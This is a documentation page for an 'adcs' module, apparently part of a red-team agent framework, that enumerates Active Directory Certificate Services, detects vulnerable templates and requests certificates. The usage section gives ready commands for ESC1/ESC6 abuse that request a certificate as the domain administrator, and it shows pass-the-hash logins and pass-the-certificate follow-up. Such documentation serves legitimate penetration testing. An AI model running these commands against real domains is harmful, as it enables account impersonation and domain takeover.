+++
title = "adcs"
chapter = false
weight = 105
hidden = false
+++

## Summary

Enumerate Active Directory Certificate Services (ADCS), detect vulnerable certificate templates, and request certificates via DCOM. Supports LDAP enumeration for CA/template discovery and DCOM-based certificate requests for ESC1/ESC6 exploitation.

Includes binary security descriptor parsing to identify which users/groups can enroll in each template, enabling accurate low-privilege exploitation detection.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `action` | Yes | `find` | `cas`: list CAs, `templates`: list templates, `find`: find vulnerable templates (ESC1-ESC4, ESC6), `request`: request a certificate via DCOM |
| `server` | Yes | | Domain controller or CA server IP/hostname |
| `username` | No | | Username (DOMAIN\user or user@domain format) |
| `password` | No | | Password for authentication |
| `hash` | No | | NT hash for pass-the-hash (request action) |
| `domain` | No | | Domain name (auto-parsed from username) |
| `port` | No | 389/636 | LDAP port (389 for LDAP, 636 for LDAPS). Not used for request. |
| `use_tls` | No | false | Use LDAPS (TLS) instead of plain LDAP. Not used for request. |
| `ca_name` | Yes (request) | | Certificate Authority name (from `adcs -action cas`) |
| `template` | Yes (request) | | Certificate template name (e.g., `User`, `Machine`, or a vulnerable template) |
| `subject` | No | CN=<user> | Certificate subject (e.g., `CN=user,O=org`) |
| `alt_name` | No | | Subject Alternative Name — UPN for ESC1 (e.g., `administrator@domain.local`) or DNS name |
| `timeout` | No | 30 | DCOM connection timeout in seconds (request action) |

## Vulnerability Checks

| ESC | Name | Detection Criteria |
|-----|------|-------------------|
| ESC1 | Enrollee Supplies Subject | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + Client Auth EKU + low-priv enrollment + no manager approval |
| ESC2 | Any Purpose / SubCA | Any Purpose EKU or no EKU (SubCA) + low-priv enrollment |
| ESC3 | Certificate Request Agent | Certificate Request Agent EKU + low-priv enrollment |
| ESC4 | Template ACL Abuse | Low-priv user has WriteDACL/WriteOwner/GenericAll on template |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA policy EditFlags has `EDITF_ATTRIBUTESUBJECTALTNAME2` set (checked via DCOM ICertAdminD2::GetConfigEntry) |

Low-privilege groups detected: Everyone, Authenticated Users, BUILTIN\Users, Domain Users (RID 513), Domain Computers (RID 515).

## Usage

```
# Find vulnerable templates (recommended first action)
adcs -action find -server 192.168.1.10 -username user@domain.local -password Pass123

# List all Certificate Authorities
adcs -action cas -server dc01 -username user@domain.local -password Pass123

# List all certificate templates with security-relevant attributes
adcs -action templates -server dc01 -username user@domain.local -password Pass123

# Request a certificate from a specific template
adcs -action request -server ca01 -ca_name ESSOS-CA -template User -username ESSOS\user -password Pass123

# ESC1: Request cert as another user via SAN (requires ENROLLEE_SUPPLIES_SUBJECT)
adcs -action request -server ca01 -ca_name ESSOS-CA -template VulnTemplate -username ESSOS\user -password Pass123 -alt_name administrator@essos.local

# ESC6: Request cert with SAN attribute (requires EDITF_ATTRIBUTESUBJECTALTNAME2 on CA)
adcs -action request -server ca01 -ca_name ESSOS-CA -template User -username ESSOS\user -password Pass123 -alt_name administrator@essos.local

# Pass-the-hash authentication for request
adcs -action request -server ca01 -ca_name ESSOS-CA -template User -username ESSOS\user -hash aad3b435b51404ee:31d6cf...

# Use LDAPS for enumeration
adcs -action find -server dc01 -username user@domain.local -password Pass123 -use_tls true
```

## Certificate Request Workflow

1. **Enumerate**: Use `adcs -action find` to identify vulnerable templates
2. **Request**: Use `adcs -action request` with the template name and CA from enumeration
3. **Use**: The returned PEM certificate + private key can be used for:
   - PKINIT authentication (`getTGT` with certificate)
   - Pass-the-certificate attacks
   - Rubeus `/certificate:` parameter

## Example Output

### `request` action (certificate issued)
```
CA: ESSOS-CA | Template: ESC1-Vuln
Request ID: 42
Disposition: ISSUED (0x00000003)

--- ISSUED CERTIFICATE ---
-----BEGIN CERTIFICATE-----
MIIDpTCCAo2gAwIBAgITEgAAACoAA...
-----END CERTIFICATE-----

--- PRIVATE KEY ---
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5...
-----END RSA PRIVATE KEY-----

Subject: CN=administrator,DC=essos,DC=local
Issuer: CN=ESSOS-CA,DC=essos,DC=local
Serial: 110000002a0000...
Valid: 2026-03-04 12:00:00 → 2027-03-04 12:00:00
```

### `find` action
```
ADCS Vulnerability Assessment
============================================================
CAs: 1 | Templates: 40 | Published: 18

[!] ESC1 (CA: ESSOS-CA)
    ESC1: Enrollee supplies subject + auth EKU + low-priv enrollment (Domain Users)
    EKUs: Client Authentication

Found 1 vulnerable template(s)

------------------------------------------------------------
ESC6 Check (EDITF_ATTRIBUTESUBJECTALTNAME2)
------------------------------------------------------------
[!] ESSOS-CA (braavos.essos.local): ESC6 VULNERABLE
    EditFlags: 0x00052000 (EDITF_ATTRIBUTESUBJECTALTNAME2 is SET)
    Any template with enrollment rights can be used for impersonation
```

## Notes

- **Cross-platform**: All actions work from Windows, Linux, and macOS agents.
- **Enumeration (cas/templates/find)**: Uses LDAP to query PKI objects in AD. Only needs network access to a domain controller.
- **Request**: Uses DCOM (ICertRequestD) via port 135 + dynamic RPC ports. Connects directly to the CA server (not the DC).
- **ESC1 vs ESC6**: ESC1 requires a template with `ENROLLEE_SUPPLIES_SUBJECT` flag — the SAN is set in the CSR. ESC6 exploits the `EDITF_ATTRIBUTESUBJECTALTNAME2` CA flag — the SAN is set via request attributes regardless of template flags.
- **Pass-the-hash**: The request action supports NT hash authentication for scenarios where only a hash is available.

## MITRE ATT&CK Mapping

- **T1649** — Steal or Forge Authentication Certificates
